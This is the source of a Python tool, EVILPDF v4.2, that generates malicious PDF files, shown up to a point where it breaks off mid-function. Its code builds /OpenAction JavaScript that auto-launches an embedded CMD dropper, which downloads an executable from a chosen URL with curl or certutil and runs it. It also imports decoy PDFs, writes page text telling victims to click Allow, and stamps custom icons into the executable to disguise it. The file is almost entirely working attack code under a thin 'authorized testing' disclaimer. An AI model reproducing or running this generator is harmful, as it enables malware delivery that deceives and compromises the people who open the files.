#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░

EVILPDF v4.2 — EXE ➜ EVIL PDF EXPLOIT GENERATOR
  • Downloads your EXE from a URL and EMBEDS it inside the PDF
  • /OpenAction JavaScript: opens a new tab, auto-launches the dropper
  • The CMD dropper downloads the EXE from your URL and OPENS it
  • Import YOUR OWN PDF as the visible document (--decoy) + preview it
  • Custom page text (100-1000 chars enforced) so the victim sees content
  • Rename the embedded file, or auto-detect name from the URL
  • --embed-exe direct mode, --debug object/offset dumps
  • --icon stamps a custom icon INTO the embedded EXE
  • NEW v4.2: embed YOUR OWN batch file (--batch) / custom JS (--js)
  • Menu-driven OR full CLI — 100% Python 3 standard library

⚠ FOR AUTHORIZED SECURITY TESTING / AWARENESS USE ONLY ⚠
"""

import os
import re
import sys
import time
import random
import struct
import argparse
import subprocess
import urllib.request

__version__ = "4.2"

# ══════════════════════════════════════════════════════════════════
#  ANSI COLORS — green-on-black hacker style
# ══════════════════════════════════════════════════════════════════

class C:
    GREEN  = '\033[92m'
    LGREEN = '\033[32m'
    YELLOW = '\033[93m'
    RED    = '\033[91m'
    CYAN   = '\033[96m'
    BLUE   = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'
    BG_TITLE = '\033[102m\033[30m'


def init_ansi():
    if sys.platform.startswith('win'):
        os.system('')


def nocolor_if_dumb():
    if os.environ.get('NO_COLOR') or os.environ.get('TERM', '').lower() == 'dumb':
        for attr in ('GREEN', 'LGREEN', 'YELLOW', 'RED', 'CYAN', 'BLUE',
                     'MAGENTA', 'BOLD', 'DIM', 'RESET', 'BG_TITLE'):
            setattr(C, attr, '')


BANNER = rf"""{C.LGREEN}{C.BOLD}

███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░
{C.RESET}
{C.BG_TITLE}{C.BOLD}   E V I L P D F  -  v%s  -  EXE EVIL PDF GENERATOR   {C.RESET}
{C.CYAN}{C.BOLD}
  ╔═══════════════════════════════════════════════════════════════╗
  ║ TOOL : EVILPDF v%s — EXE ➜ evil PDF exploit generator       ║
  ║ ON OPEN : new tab ➜ cmd downloads the EXE ➜ EXE opens        ║
  ║ Feat : own PDF decoy / custom text / rename embed / ICON      ║
  ║ Feat : own batch file / own OpenAction JS file                ║
  ║ USE  : authorized security testing / red team only            ║
  ╚═══════════════════════════════════════════════════════════════╝{C.RESET}
""" % (__version__, __version__)


# ══════════════════════════════════════════════════════════════════
#  STATUS / DEBUG
# ══════════════════════════════════════════════════════════════════

DEBUG = [False]

def ts():
    return time.strftime("%H:%M:%S")

def status(sym, msg, color=None):
    print(f"  {C.DIM}[{ts()}]{C.RESET} "
          f"{(color or C.GREEN)}{C.BOLD}[{sym}]{C.RESET} {msg}")

def dbg(msg):
    if DEBUG[0]:
        print(f"  {C.DIM}[debug]{C.RESET} {C.BLUE}{msg}{C.RESET}")

def hr(ch='─', n=64):
    print(f"  {C.DIM}{ch * n}{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════

TEXT_MIN = 100
TEXT_MAX = 1000


def url_filename(url, default="update.exe"):
    """Extract the exe file name from a URL (auto-detect current name)."""
    try:
        path = url.split('?')[0].split('#')[0]
        name = path.rstrip('/').rsplit('/', 1)[-1]
        if name and '.' in name and len(name) < 80:
            return name
    except Exception:
        pass
    return default


def esc_pdf(text):
    """Escape a string for a literal PDF text-showing operator."""
    return (text.replace('\\', '\\\\')
                .replace('(', '\\(')
                .replace(')', '\\)')
                .encode('latin-1', 'replace').decode('latin-1'))


def read_text_file(path):
    """Read a text file as bytes, tolerating odd encodings."""
    with open(path, 'rb') as f:
        raw = f.read()
    for enc in ('utf-8-sig', 'utf-8', 'cp1252', 'latin-1'):
        try:
            return raw.decode(enc), raw
        except UnicodeDecodeError:
            continue
    return raw.decode('latin-1', 'replace'), raw


# ══════════════════════════════════════════════════════════════════
#  ICON STAMPER — writes a .ico into the EXE's PE resources
# ══════════════════════════════════════════════════════════════════

def validate_ico(ico_path):
    """Check the file exists and looks like a real .ico (ICONDIR header)."""
    if not os.path.isfile(ico_path):
        return False, "icon file not found"
    try:
        with open(ico_path, 'rb') as f:
            head = f.read(6)
    except OSError as e:
        return False, str(e)
    if len(head) < 6 or head[0:2] != b'\x00\x00' or head[2:4] != b'\x01\x00':
        return False, "not a valid .ico file (bad ICONDIR header)"
    if int.from_bytes(head[4:6], 'little') == 0:
        return False, ".ico contains no images"
    return True, "ok"


def apply_icon_to_exe(exe_bytes, ico_path):
    """Return EXE bytes with the icon resource replaced (Windows only).

    Uses the Win32 resource API through ctypes (no external installs):
      BeginUpdateResource / UpdateResource / EndUpdateResource
    The .ico is parsed into RT_ICON entries + a rebuilt RT_GROUP_ICON,
    and stamped into the EXE's first icon-group slot.
    """
    if not sys.platform.startswith('win'):
        raise OSError("icon stamping requires Windows (Win32 resource API)")
    import ctypes
    import tempfile
    from ctypes import wintypes

    if not exe_bytes.startswith(b'MZ'):
        raise ValueError("payload is not a Windows PE executable")

    # -- parse the .ico --
    with open(ico_path, 'rb') as f:
        ico = f.read()
    count = int.from_bytes(ico[4:6], 'little')
    entries = []
    for i in range(count):
        off = 6 + 16 * i
        w, h, cc, res, planes, bits, size = struct.unpack_from('<BBBBHHI', ico, off)
        img_off = int.from_bytes(ico[off + 12:off + 16], 'little')
        data = ico[img_off:img_off + size]
        if len(data) != size or size == 0:
            raise ValueError("corrupt .ico entry #%d" % (i + 1))
        # ICONDIRENTRY with imageOffset replaced by 1-based icon id
        entry = struct.pack('<BBBBHHIH', w, h, cc, res, planes, bits, size, i + 1)
        entries.append((entry, data))
    group = struct.pack('<HHH', 0, 1, count) + b''.join(e[0] for e in entries)

    # -- put the exe on disk so the Win32 API can touch it --
    tmpd = tempfile.mkdtemp(prefix='evilpdf_icon_')
    exe_path = os.path.join(tmpd, 'payload.exe')
    with open(exe_path, 'wb') as f:
        f.write(exe_bytes)

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)

    RT_ICON       = 3
    RT_GROUP_ICON = 14
    LANG_NEUTRAL  = 0
    LOAD_LIBRARY_AS_DATAFILE = 0x2

    # -- find the exe's existing first icon-group id (usually 1) --
    group_id = 1
    k32.LoadLibraryExW.argtypes = [wintypes.LPCWSTR, wintypes.HANDLE, wintypes.DWORD]
    k32.LoadLibraryExW.restype = wintypes.HMODULE
    h = k32.LoadLibraryExW(exe_path, None, LOAD_LIBRARY_AS_DATAFILE)
    if h:
        found = []

        CBNUM = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMODULE,
                                   ctypes.c_void_p, ctypes.c_void_p, wintypes.LPARAM)
        def _cb(hmod, lpszType, lpszName, lparam):
            # numeric resource ids arrive as small pointer values (IS_INTRESOURCE)
            if lpszName and (lpszName >> 16) == 0:
                found.append(lpszName)
            return False   # stop after the first one

        k32.EnumResourceNamesW.argtypes = [wintypes.HMODULE, ctypes.c_void_p,
                                           CBNUM, wintypes.LPARAM]
        k32.EnumResourceNamesW.restype = wintypes.BOOL
        k32.EnumResourceNamesW(h, ctypes.c_void_p(RT_GROUP_ICON), CBNUM(_cb), 0)
        k32.FreeLibrary.argtypes = [wintypes.HMODULE]
        k32.FreeLibrary(h)
        if found:
            group_id = found[0]
            dbg("existing icon-group id: %d" % group_id)
        else:
            dbg("no existing icon group — creating id 1")

    # -- stamp the icon resources --
    k32.BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
    k32.BeginUpdateResourceW.restype = wintypes.HANDLE
    hu = k32.BeginUpdateResourceW(exe_path, False)
    if not hu:
        raise OSError("BeginUpdateResource failed (err %d)"
                      % ctypes.get_last_error())

    k32.UpdateResourceW.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                    ctypes.c_void_p, wintypes.WORD,
                                    ctypes.c_void_p, wintypes.DWORD]
    k32.UpdateResourceW.restype = wintypes.BOOL
    ok = True
    for idx, (_entry, data) in enumerate(entries, start=1):
        if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_ICON),
                                  ctypes.c_void_p(idx), LANG_NEUTRAL,
                                  data, len(data)):
            ok = False
            dbg("UpdateResourceW RT_ICON #%d failed (err %d)"
                % (idx, ctypes.get_last_error()))
    if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_GROUP_ICON),
                               ctypes.c_void_p(group_id), LANG_NEUTRAL,
                               group, len(group)):
        ok = False
        dbg("UpdateResourceW RT_GROUP_ICON failed (err %d)"
            % ctypes.get_last_error())

    k32.EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
    k32.EndUpdateResourceW.restype = wintypes.BOOL
    if not k32.EndUpdateResourceW(hu, False) or not ok:
        raise OSError("icon stamp failed (err %d)" % ctypes.get_last_error())

    # -- read back and clean up --
    with open(exe_path, 'rb') as f:
        new_bytes = f.read()
    try:
        os.remove(exe_path)
        os.rmdir(tmpd)
    except OSError:
        pass

    if not new_bytes.startswith(b'MZ') or len(new_bytes) < len(exe_bytes):
        raise ValueError("icon stamp corrupted the EXE — keeping original")
    dbg("exe size %s -> %s bytes after icon stamp"
        % (f"{len(exe_bytes):,}", f"{len(new_bytes):,}"))
    return new_bytes


# ══════════════════════════════════════════════════════════════════
#  EVILPDF GENERATOR
# ══════════════════════════════════════════════════════════════════

class EvilPDF:
    """EXE ➜ evil PDF exploit generator (v4.2).

    On open, /OpenAction JavaScript:
      1) app.launchURL(url, true) -> NEW BROWSER TAB to the EXE URL
      2) exportDataObject(nLaunch: 2) -> launches the embedded dropper

    v4.2: embed your own batch file (--batch) or supply the whole
    /OpenAction JavaScript from a file (--js) instead of the built-in.
    """

    def __init__(self, exe_url, pdf_name, save_path=".", embed="cmd",
                 decoy_pdf=None, custom_text=None, alias=None, debug=False,
                 icon=None, batch_file=None, js_file=None):
        self.exe_url   = exe_url.strip()
        self.pdf_name  = pdf_name.strip()
        self.save_path = save_path
        self.embed     = embed            # cmd | exe | url | batch | js
        self.decoy_pdf = decoy_pdf
        self.custom_text = custom_text    # list of lines or None
        self.alias     = alias            # embedded file name or None
        self.icon      = icon             # .ico file path (embed-exe only)
        self.batch_file = batch_file      # your own batch file (batch mode)
        self.js_file    = js_file         # your own OpenAction JS (js mode)
        self.exe_data  = None
        self.icon_applied = False
        self.output_file = None

    # ── VALIDATION ─────────────────────────────────────────────
    def validate(self):
        status("⚙", "Validating inputs...")

        if not self.exe_url:
            print(f"  {C.RED}[✗] EXE URL is empty!{C.RESET}")
            return False
        if not (self.exe_url.startswith("http://") or
                self.exe_url.startswith("https://")):
            print(f"  {C.RED}[✗] Invalid URL: {self.exe_url}{C.RESET}")
            return False

        if not self.pdf_name:
            print(f"  {C.RED}[✗] PDF name is empty!{C.RESET}")
            return False
        if any(ch in self.pdf_name for ch in '\\/:*?"<>|'):
            print(f"  {C.RED}[✗] Invalid PDF name: {self.pdf_name}{C.RESET}")
            return False

        self.save_path = os.path.abspath(os.path.expanduser(self.save_path.strip()))
        if not os.path.isdir(self.save_path):
            try:
                os.makedirs(self.save_path, exist_ok=True)
                status("✓", f"Created output dir: {C.CYAN}{self.save_path}{C.RESET}")
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot create dir: {e}{C.RESET}")
                return False

        if not self.pdf_name.lower().endswith('.pdf'):
            self.pdf_name += '.pdf'
        self.output_file = os.path.join(self.save_path, self.pdf_name)

        # ── decoy PDF check ──
        if self.decoy_pdf:
            self.decoy_pdf = os.path.abspath(os.path.expanduser(self.decoy_pdf))
            if not os.path.isfile(self.decoy_pdf):
                print(f"  {C.RED}[✗] Decoy PDF not found: {self.decoy_pdf}{C.RESET}")
                return False
            try:
                with open(self.decoy_pdf, 'rb') as f:
                    head = f.read(8)
                if not head.startswith(b'%PDF-'):
                    print(f"  {C.RED}[✗] Decoy file is not a valid PDF!{C.RESET}")
                    return False
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read decoy: {e}{C.RESET}")
                return False
            status("✓", f"Decoy PDF ready : {C.CYAN}{self.decoy_pdf}{C.RESET} "
                        f"({C.YELLOW}{os.path.getsize(self.decoy_pdf):,}{C.RESET} bytes)")

        # ── custom page text length ──
        if self.custom_text:
            blob = "\n".join(self.custom_text)
            n = len(blob)
            if n > TEXT_MAX:
                print(f"  {C.RED}[✗] Page text is {n} chars — max is "
                      f"{TEXT_MAX}!{C.RESET}")
                return False
            if n < TEXT_MIN:
                status("!", f"Page text is only {n} chars (min {TEXT_MIN}) — "
                            f"the page will look sparse.", C.YELLOW)
            status("✓", f"Page text       : {C.YELLOW}{n}{C.RESET}/{TEXT_MAX} chars")

        # ── icon checks ──
        if self.icon:
            self.icon = os.path.abspath(os.path.expanduser(self.icon))
            ok, why = validate_ico(self.icon)
            if not ok:
                print(f"  {C.RED}[✗] Invalid icon file '{self.icon}': {why}{C.RESET}")
                return False
            if self.embed != "exe":
                status("!", f"Icon ignored in '{self.embed}' mode — the icon can "
                            f"only be stamped into a directly-embedded EXE "
                            f"(use --embed-exe).", C.YELLOW)
                self.icon = None
            else:
                size = os.path.getsize(self.icon)
                status("✓", f"Icon file OK    : {C.CYAN}{self.icon}{C.RESET} "
                            f"({C.YELLOW}{size:,}{C.RESET} bytes)")

        # ── your own batch file ──
        if self.embed == "batch":
            if not self.batch_file:
                print(f"  {C.RED}[✗] batch mode needs a batch file path!{C.RESET}")
                return False
            self.batch_file = os.path.abspath(os.path.expanduser(self.batch_file))
            if not os.path.isfile(self.batch_file):
                print(f"  {C.RED}[✗] Batch file not found: {self.batch_file}{C.RESET}")
                return False
            try:
                body, raw = read_text_file(self.batch_file)
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read batch file: {e}{C.RESET}")
                return False
            if not body.strip():
                print(f"  {C.RED}[✗] Batch file is empty!{C.RESET}")
                return False
            status("✓", f"Batch file OK   : {C.CYAN}{self.batch_file}{C.RESET} "
                        f"({C.YELLOW}{len(raw):,}{C.RESET} bytes, "
                        f"{len(body.splitlines())} lines)")
            if not re.search(r'(?im)^\s*@?echo', body):
                status("!", "Batch file has no @echo off — the victim may see "
                            "the command trace.", C.YELLOW)

        # ── your own OpenAction JavaScript ──
        if self.embed == "js":
            if not self.js_file:
                print(f"  {C.RED}[✗] js mode needs a JavaScript file path!{C.RESET}")
                return False
            self.js_file = os.path.abspath(os.path.expanduser(self.js_file))
            if not os.path.isfile(self.js_file):
                print(f"  {C.RED}[✗] JS file not found: {self.js_file}{C.RESET}")
                return False
            try:
                js_src, _raw = read_text_file(self.js_file)
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read JS file: {e}{C.RESET}")
                return False
            if not js_src.strip():
                print(f"  {C.RED}[✗] JS file is empty!{C.RESET}")
                return False
            self.js_src = js_src
            status("✓", f"JS file OK      : {C.CYAN}{self.js_file}{C.RESET} "
                        f"({C.YELLOW}{len(js_src):,}{C.RESET} chars)")
            if "exportDataObject" not in js_src:
                status("!", "JS has no exportDataObject() call — the embedded "
                            "dropper will not auto-launch.", C.YELLOW)

        # ── resolve embedded file name ──
        self.auto_exe_name = url_filename(self.exe_url)
        if self.embed == "exe" or not self.embed:
            self.embed_name = (self.alias or self.auto_exe_name)
            if self.embed == "exe" and not self.embed_name.lower().endswith('.exe'):
                self.embed_name += '.exe'
        elif self.embed == "batch":
            a = (self.alias or os.path.basename(self.batch_file) or "update.cmd").strip()
            if a.lower().endswith('.txt'):
                a = a[:-4]
            if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
                a += '.cmd'
            self.embed_name = a
        else:  # cmd / js mode
            a = (self.alias or "update.cmd").strip()
            if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
                a += '.cmd'
            self.embed_name = a

        if self.embed:
            status("✓", f"Embedded file    : {C.CYAN}{self.embed_name}{C.RESET}")
        status("✓", f"Detected EXE name from URL: "
                    f"{C.CYAN}{self.auto_exe_name}{C.RESET}")
        status("✓", f"Target output    : {C.CYAN}{self.output_file}{C.RESET}")
        return True

    # ── DOWNLOAD EXE (pre-flight) ──────────────────────────────
    def download_exe(self):
        try:
            status("⬇", f"Pre-flight — fetching payload: {C.CYAN}{self.exe_url}{C.RESET}")
            req = urllib.request.Request(
                self.exe_url,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=30) as resp:
                self.exe_data = resp.read()
            dt = time.time() - t0
            if len(self.exe_data) < 64:
                status("!", f"Payload very small ({len(self.exe_data)} bytes) "
                            f"— check the URL", C.YELLOW)
            status("✓", f"Payload OK: {C.YELLOW}{len(self.exe_data):,}{C.RESET} bytes "
                        f"in {dt:.2f}s")
            return True
        except Exception as e:
            print(f"  {C.RED}[✗] Error fetching EXE: {e}{C.RESET}")
            return False

    # ── CMD DROPPER (downloads the EXE + opens it) ────────────
    def build_cmd_dropper(self):
        return (
            "@echo off\r\n"
            "setlocal\r\n"
            f'set "EXEURL={self.exe_url}"\r\n'
            f'set "EXENAME={self.auto_exe_name}"\r\n'
            'set "EXEDIR=%TEMP%\\evilpdf"\r\n'
            'if not exist "%EXEDIR%" mkdir "%EXEDIR%"\r\n'
            'cd /d "%EXEDIR%"\r\n'
            'where curl >nul 2>nul\r\n'
            'if %errorlevel%==0 (\r\n'
            '    curl -s -L -o "%EXENAME%" "%EXEURL%"\r\n'
            ') else (\r\n'
            '    certutil -urlcache -split -f "%EXEURL%" "%EXENAME%" >nul 2>nul\r\n'
            ')\r\n'
            'if exist "%EXENAME%" (\r\n'
            '    start "" "%EXENAME%"\r\n'
            ')\r\n'
            "endlocal\r\n"
        )

    # ── PAYLOAD BYTES ──────────────────────────────────────────
    def build_payload(self):
        if self.embed in ("cmd", "js"):
            return self.build_cmd_dropper().encode('utf-8')
        if self.embed == "batch":
            _body, raw = read_text_file(self.batch_file)
            raw = raw.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
            raw = raw.replace(b'\n', b'\r\n')
            if raw and not raw.endswith(b'\r\n'):
                raw += b'\r\n'
            return raw
        if self.embed == "exe":
            if self.exe_data is None and not self.download_exe():
                raise ValueError("could not download EXE for embed")
            return self.exe_data
        return b""

    # ── /OpenAction JAVASCRIPT ─────────────────────────────────
    def build_javascript(self):
        # user-supplied JS wins
        if self.embed == "js" and getattr(self, "js_src", ""):
            dbg("using user-supplied JavaScript from " + self.js_file)
            return self.js_src

        url_css = self.exe_url.replace('\\', '\\\\').replace('"', '\\"')
        name_css = self.embed_name.replace('\\', '\\\\').replace('"', '\\"')
        if not self.embed:
            js = f"""
try {{ app.launchURL("{url_css}", true); }}
catch(e) {{ try {{ this.getURL("{url_css}"); }} catch(e2) {{}} }}
"""
        else:
            js = f"""
try {{
    // ► STEP 1: open a NEW BROWSER TAB pointing at the EXE URL
    try {{ app.launchURL("{url_css}", true); }} catch(e0) {{}}
    // ► STEP 2: auto-launch the embedded dropper (cmd window opens)
    try {{
        this.exportDataObject({{cName: "{name_css}", nLaunch: 2}});
    }} catch(e1) {{
        try {{ this.getURL("{url_css}"); }} catch(e2) {{}}
    }}
}} catch(outer) {{
    try {{ app.launchURL("{url_css}", true); }} catch(unused) {{}}
}}
"""
        dbg("JS payload:\n" + js)
        return js

    # ── VISIBLE PAGE CONTENT (custom text support) ────────────
    def build_page_content(self):
        if self.custom_text:
            lines = [ln for ln in self.custom_text if ln.strip()]
        else:
            lines = ["Document", "",
                     "Please wait while the document loads...",
                     "A security warning may appear if you open this file",
                     "outside of a trusted location. Click Allow to continue."]
        max_lines = 39                      # fits inside the 612x792 mediabox
        if len(lines) > max_lines:
            status("!", f"{len(lines)} text lines — only the first {max_lines} "
                        f"fit on the page.", C.YELLOW)
            lines = lines[:max_lines]
        ops, y = [], 712
        for i, ln in enumerate(lines):
            text = ln.strip()
            if text:
                if i == 0:
                    ops.append(f"BT /F1 18 Tf 72 {y} Td ({esc_pdf(text)}) Tj ET")
                    y -= 30
                else:
                    ops.append(f"BT /F2 12 Tf 72 {y} Td ({esc_pdf(text)}) Tj ET")
                    y -= 18
            else:
                y -= 18
        return "\n".join(ops) + "\n"

    # ── PDF TEXT ESCAPE for JS object ──────────────────────────
    @staticmethod
    def js_literal(js):
        return (js.replace('\\', '\\\\')
                  .replace('(', '\\(')
                  .replace(')', '\\)'))

    @staticmethod
    def esc_name(name):
        return name.replace('\\', r'\\').replace('(', r'\(').replace(')', r'\)')

    # ══ BUILD MODE A: WITH USER-PROVIDED DECOY PDF ═══════════
    def build_with_decoy(self):
        with open(self.decoy_pdf, 'rb') as f:
            raw = f.read()

        # -- parse existing structure --
        nums = [int(n) for n in re.findall(rb'(\d+)\s+0\s+obj\b', raw)]
        if not nums:
            raise ValueError("no objects found in decoy PDF")
        base = max(nums)
        sm = re.search(rb'startxref\s+(\d+)', raw[-4096:])
        if not sm:
            raise ValueError("no startxref found in decoy PDF")
        old_xref = int(sm.group(1))
        tr = re.search(rb'/Root\s+(\d+)\s+0\s+R', raw)
        if not tr:
            raise ValueError("no /Root in decoy trailer")
        root_num = int(tr.group(1))
        root_body = b''
        for m in re.finditer(rb'(\d+)\s+0\s+obj(.*?)endobj', raw, re.S):
            if int(m.group(1)) == root_num:
                root_body = m.group(2)
                break
        pm = re.search(rb'/Pages\s+(\d+)\s+0\s+R', root_body)
        if not pm:
            raise ValueError("decoy root has no /Pages — cannot import")
        pages_ref = f"{int(pm.group(1))} 0 R"

        dbg(f"decoy max_obj={base} old_xref=@{old_xref} "
            f"root={root_num} pages={pages_ref}")

        # -- payload bytes --
        payload = self.build_payload()

        js = self.js_literal(self.build_javascript())

        marker = "EVILPDF_PAYLOAD"
        new_objs = []

        # new catalog: clone decoy /Pages + our /OpenAction + attachments
        n_cat = base + 1
        cat = (f"<< /Type /Catalog /Pages {pages_ref} /OpenAction "
               f"{n_cat + 1} 0 R")
        if self.embed:
            cat += (f" /Names << /EmbeddedFiles << /Names "
                    f"[({self.esc_name(self.embed_name)}) "
                    f"{n_cat + 2} 0 R] >> >> /PageMode /UseAttachments")
        cat += " >>"
        new_objs.append(cat.encode('latin-1'))

        # OpenAction JS
        new_objs.append(f"<< /S /JavaScript /JS ({js}) >>".encode('latin-1'))

        # Filespec + embedded stream
        if self.embed:
            new_objs.append((f"<< /Type /Filespec /F ({self.esc_name(self.embed_name)}) "
                             f"/EF << /F {n_cat + 3} 0 R >> >>").encode('latin-1'))
            new_objs.append((f"<< /Type /EmbeddedFile /Subtype "
                             f"/application/octet-stream /Length {len(payload)} >>\n"
                             f"stream\n{marker}\nendstream").encode('latin-1'))
        else:
            new_objs.append(b"<< /Type /Filespec /F (null) /Length 0 >>")
            new_objs.append(b"<< /Type /EmbeddedFile /Length 0 >>\nstream\n\nendstream")

        # -- assemble --
        out = bytearray(raw)
        offsets = []
        for i, body in enumerate(new_objs):
            n = n_cat + i
            offsets.append((n, len(out)))
            out += f"{n} 0 obj\n".encode()
            if marker.encode() in body and payload:
                head, _, tail = body.partition(marker.encode())
                out += head + payload + tail
            else:
                out += body
            out += b"\nendobj\n"

        xref_off = len(out)
        out += f"xref\n{n_cat} {len(new_objs)}\n".encode()
        for _n, off in offsets:
            out += f"{off:010d} 00000 n \n".encode()
        out += (f"trailer\n<< /Size {base + len(new_objs) + 1} /Root "
                f"{n_cat} 0 R /Prev {old_xref} >>\n"
                f"startxref\n{xref_off}\n%%EOF\n").encode()

        if DEBUG[0]:
            print(f"  {C.DIM}[debug] appended objects:{C.RESET}")
            for n, off in offsets:
                print(f"  {C.DIM}[debug]   obj {n:>3} @ {off}{C.RESET}")
        return bytes(out), offsets, base

    # ══ BUILD MODE B: FULL PDF FROM SCRATCH ══════════════════
    def build_scratch(self):
        js = self.js_literal(self.build_javascript())

        payload = self.build_payload()

        objs = []

        cat = "<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R"
        if self.embed:
            cat += (f" /Names << /EmbeddedFiles << /Names "
                    f"[({self.esc_name(self.embed_name)}) 6 0 R] >> >> "
                    f"/PageMode /UseAttachments")
        cat += " >>"
        objs.append(cat)

        objs.append("<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        objs.append("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                    "/Contents 4 0 R /Resources << /Font "
                    "<< /F1 8 0 R /F2 9 0 R >> >> >>")

        pc = self.build_page_content()
        objs.append(f"<< /Length {len(pc)} >>\nstream\n{pc}endstream")
        objs.append(f"<< /S /JavaScript /JS ({js}) >>")

        if self.embed:
            objs.append(f"<< /Type /Filespec /F ({self.esc_name(self.embed_name)}) "
                        f"/EF << /F 7 0 R >> >>")
        else:
            objs.append("<< /Type /Filespec /F (null) /Length 0 >>")

        if self.embed:
            objs.append(f"<< /Type /EmbeddedFile /Subtype "
                        f"/application/octet-stream /Length {len(payload)} >>\n"
                        f"stream\nEVILPDF_PAYLOAD\nendstream")
        else:
            objs.append("<< /Type /EmbeddedFile /Length 0 >>\nstream\n\nendstream")

        objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>")
        objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

        file_id = ''.join(random.choices('0123456789ABCDEF', k=32))
        marker = "EVILPDF_PAYLOAD"

        pdf = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        labels = ["Catalog", "Pages", "Page", "Contents",
                  "OpenAction", "Filespec", "EmbeddedFile", "Font", "Font"]
        offsets, rows = [], []
        for num, body in enumerate(objs, start=1):
            off = len(pdf)
            offsets.append(off)
            pdf += f"{num} 0 obj\n".encode()
            if marker in body:
                head, _, tail = body.partition(marker)
                pdf += head.encode()
                pdf += payload
                pdf += tail.encode()
            else:
                pdf += body.encode()
            pdf += b"endobj\n"
            rows.append((num, labels[num - 1], off))

        xref_off = len(pdf)
        pdf += f"xref\n0 {len(objs) + 1}\n".encode()
        pdf += b"0000000000 65535 f \n"
        for off in offsets:
            pdf += f"{off:010d} 00000 n \n".encode()
        pdf += (f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R "
                f"/ID [<{file_id}> <{file_id}>] >>\n"
                f"startxref\n{xref_off}\n%%EOF\n").encode()
        return bytes(pdf), rows, None

    # ── stamp the custom icon into the EXE bytes ──────────────
    def stamp_icon(self):
        """If an icon was configured, stamp it into self.exe_data."""
        if not self.icon or self.embed != "exe" or self.exe_data is None:
            return
        if not sys.platform.startswith('win'):
            status("!", "Icon NOT applied: icon stamping needs Windows "
                       "(running on %s)." % sys.platform, C.YELLOW)
            return
        try:
            status("⚙", f"Stamping icon into EXE: {C.CYAN}{self.icon}{C.RESET} ...")
            self.exe_data = apply_icon_to_exe(self.exe_data, self.icon)
            self.icon_applied = True
            status("✓", f"Icon applied! EXE is now "
                        f"{C.YELLOW}{len(self.exe_data):,}{C.RESET} bytes")
        except Exception as e:
            status("!", f"Icon stamp failed ({e}) — embedding the EXE with "
                       f"its ORIGINAL icon.", C.YELLOW)

    # ── MAIN GENERATE ─────────────────────────────────────────
    def generate(self):
        try:
            if self.embed == "exe" and not self.download_exe():
                print("  " + C.RED + "[✗] cannot continue without the EXE" + C.RESET)
                return False

            # stamp the icon BEFORE building the PDF
            if self.embed == "exe":
                self.stamp_icon()

            mode = "decoy-import" if self.decoy_pdf else "scratch"
            status("⚙", f"Building exploit structure ({mode} mode)...")
            if self.decoy_pdf:
                try:
                    pdf, rows, _ = self.build_with_decoy()
                except ValueError as e:
                    print(f"  {C.RED}[✗] decoy import failed: {e}{C.RESET}")
                    print(f"  {C.YELLOW}[!] falling back to scratch mode...{C.RESET}")
                    self.decoy_pdf = None
                    pdf, rows, _ = self.build_scratch()
            else:
                pdf, rows, _ = self.build_scratch()

            status("⚙", f"Writing PDF: {C.CYAN}{self.output_file}{C.RESET} ...")
            with open(self.output_file, 'wb') as f:
                f.write(pdf)

            size = os.path.getsize(self.output_file)
            if size < 500:
                print(f"  {C.RED}[✗] output suspiciously small!{C.RESET}")
                return False
            status("✓", f"EVIL PDF created : {C.CYAN}{self.output_file}{C.RESET}")
            status("✓", f"File size        : {C.YELLOW}{size:,}{C.RESET} bytes")

            if DEBUG[0]:
                hr()
                print(f"  {C.DIM}[debug] object map:{C.RESET}")
                for r in rows:
                    if isinstance(r, tuple) and len(r) == 3:
                        print(f"  {C.DIM}[debug]   obj {r[0]:>3} "
                              f"{r[1]:<12} @ {r[2]}{C.RESET}")
                hr()

            print()
            hr('═')
            print(f"  {C.BOLD}{C.YELLOW}EXPLOIT DETAILS:{C.RESET}")
            hr('═')
            def row(label, value):
                print(f"  {C.GREEN}{C.BOLD}►{C.RESET} {label:<15}: "
